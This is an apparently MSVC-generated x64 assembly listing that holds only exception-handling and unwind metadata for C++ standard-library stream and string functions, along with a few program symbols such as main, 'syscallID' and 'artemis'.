;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z DB 04H
	DB	0eH
	DD	imagerel ?dtor$0@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z
	DD	imagerel $ip2state$??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z DD 010911H
	DD	0c209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ DB 060H
	DD	imagerel $ip2state$??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ DD 010919H
	DD	06209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z DB 06H
	DB	00H
	DB	00H
	DB	'<'
	DB	02H
	DB	095H, 02H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z DB 028H
	DD	imagerel $stateUnwindMap$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z
	DD	imagerel $ip2state$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z DD 010e11H
	DD	0620eH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ DB 02H
	DB	00H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ DB 060H
	DD	imagerel $ip2state$??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ DD 010919H
	DD	06209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z DD 010e01H
	DD	0620eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$endl@DU?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@@Z DD 010901H
	DD	04209H
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$1@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA DD 020a01H
	DD	05006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z DB 0aH
	DB	00H
	DB	00H
	DB	'm', 03H
	DB	02H
	DB	'H'
	DB	04H
	DB	019H, 09H
	DB	02H
	DB	'|'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$1@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z DB 02H
	DB	02H
	DB	02H
	DB	04H
	DD	imagerel $handlerMap$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z DB 06H
	DB	0eH
	DD	imagerel ?dtor$0@?0???$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z@4HA
	DB	028H
	DB	030H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z DB 038H
	DD	imagerel $stateUnwindMap$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z
	DD	imagerel $tryMap$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z
	DD	imagerel $ip2state$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z DD 021119H
	DD	0150111H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??$?6U?$char_traits@D@std@@@std@@YAAEAV?$basic_ostream@DU?$char_traits@D@std@@@0@AEAV10@PEBD@Z
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$1@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA DD 020a01H
	DD	05006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ DB 0aH
	DB	00H
	DB	00H
	DB	08aH
	DB	02H
	DB	'2'
	DB	04H
	DB	'@'
	DB	02H
	DB	'R'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$1@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ DB 02H
	DB	02H
	DB	02H
	DB	04H
	DD	imagerel $handlerMap$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ DB 06H
	DB	0eH
	DD	imagerel ?dtor$0@?0??flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ@4HA
	DB	028H
	DB	030H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ DB 038H
	DD	imagerel $stateUnwindMap$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ
	DD	imagerel $tryMap$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ
	DD	imagerel $ip2state$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ DD 010919H
	DD	08209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?flush@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@XZ
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$1@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA DD 020a01H
	DD	05006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z DB 0aH
	DB	00H
	DB	00H
	DB	'J'
	DB	02H
	DB	'<'
	DB	04H
	DB	0d2H
	DB	02H
	DB	'd'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$1@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z DB 02H
	DB	02H
	DB	02H
	DB	04H
	DD	imagerel $handlerMap$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z DB 06H
	DB	0eH
	DD	imagerel ?dtor$0@?0??put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z@4HA
	DB	028H
	DB	030H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z DB 038H
	DD	imagerel $stateUnwindMap$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z
	DD	imagerel $tryMap$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z
	DD	imagerel $ip2state$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z DD 010d19H
	DD	0a20dH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?put@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV12@D@Z
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA DD 020a01H
	DD	05006520aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z DB 0eH
	DB	00H
	DB	00H
	DB	'\'
	DB	02H
	DB	09cH
	DB	04H
	DB	01eH
	DB	02H
	DB	016H
	DB	06H
	DB	0adH, 03H
	DB	02H
	DB	'v'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z DB 02H
	DB	04H
	DB	04H
	DB	06H
	DD	imagerel $handlerMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z DB 08H
	DB	0eH
	DD	imagerel ?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z@4HA
	DB	050H
	DB	058H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z DB 038H
	DD	imagerel $stateUnwindMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z
	DD	imagerel $tryMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z
	DD	imagerel $ip2state$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z DD 041319H
	DD	0190113H
	DD	0600b700cH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@PEBX@Z
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA DD 020a01H
	DD	05006520aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z DB 0eH
	DB	00H
	DB	00H
	DB	'Z'
	DB	02H
	DB	09cH
	DB	04H
	DB	01eH
	DB	02H
	DB	016H
	DB	06H
	DB	0a5H, 03H
	DB	02H
	DB	'v'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$2@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z DB 02H
	DB	04H
	DB	04H
	DB	06H
	DD	imagerel $handlerMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z DB 08H
	DB	0eH
	DD	imagerel ?dtor$0@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA
	DB	02eH
	DD	imagerel ?dtor$1@?0???6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z@4HA
	DB	050H
	DB	058H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z DB 038H
	DD	imagerel $stateUnwindMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z
	DD	imagerel $tryMap$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z
	DD	imagerel $ip2state$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z DD 041219H
	DD	0190112H
	DD	0600a700bH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@J@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAVios_base@1@AEAV21@@Z@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??6?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAAEAV01@P6AAEAV01@AEAV01@@Z@Z DD 010e01H
	DD	0420eH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	00H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?catch$0@?0??_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ@4HA DD 020a01H
	DD	05006320aH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ DB 06H
	DB	00H
	DB	00H
	DB	012H
	DB	02H
	DB	0fdH, 02H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$handlerMap$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ DB 02H
	DB	01H
	DB	080H
	DD	imagerel ?catch$0@?0??_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$tryMap$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ DB 02H
	DB	00H
	DB	00H
	DB	02H
	DD	imagerel $handlerMap$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ DB 04H
	DB	08H
	DB	010H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ DB 038H
	DD	imagerel $stateUnwindMap$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ
	DD	imagerel $tryMap$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ
	DD	imagerel $ip2state$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ DD 010919H
	DD	08209H
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0??widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z DB 06H
	DB	00H
	DB	00H
	DB	'V'
	DB	02H
	DB	'6'
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0??widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z DB 028H
	DD	imagerel $stateUnwindMap$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z
	DD	imagerel $ip2state$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z DD 010d11H
	DD	0a20dH
	DD	imagerel __CxxFrameHandler4
	DD	imagerel $cppxdata$?widen@?$basic_ios@DU?$char_traits@D@std@@@std@@QEBADD@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?setstate@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z DD 011201H
	DD	04212H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?clear@?$basic_ios@DU?$char_traits@D@std@@@std@@QEAAXH_N@Z DD 011201H
	DD	06212H
xdata	ENDS
voltbl	SEGMENT
_volmd	DD	0ffffffffH
	DDSymXIndex: 	FLAT:main
	DD	014H
	DD	021bH
voltbl	ENDS
xdata	SEGMENT
$unwind$main DD	041c19H
	DD	033010aH
	DD	060027003H
	DD	imagerel __GSHandlerCheck
	DD	0180H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__EsyscallID@@YAXXZ DD 010401H
	DD	0a204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Fartemis@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??__Eartemis@@YAXXZ DD 010401H
	DD	04204H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$?dtor$0@?0???$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z@4HA DD 020601H
	DD	050023206H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$ip2state$??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z DB 06H
	DB	00H
	DB	00H
	DB	'`'
	DB	02H
	DB	01dH, 02H
	DB	00H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$stateUnwindMap$??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z DB 02H
	DB	0eH
	DD	imagerel ?dtor$0@?0???$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z@4HA
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$cppxdata$??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z DB 028H
	DD	imagerel $stateUnwindMap$??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z
	DD	imagerel $ip2state$??$?0V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_Vector_iterator@V?$_Vector_val@U?$_Simple_types@_W@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
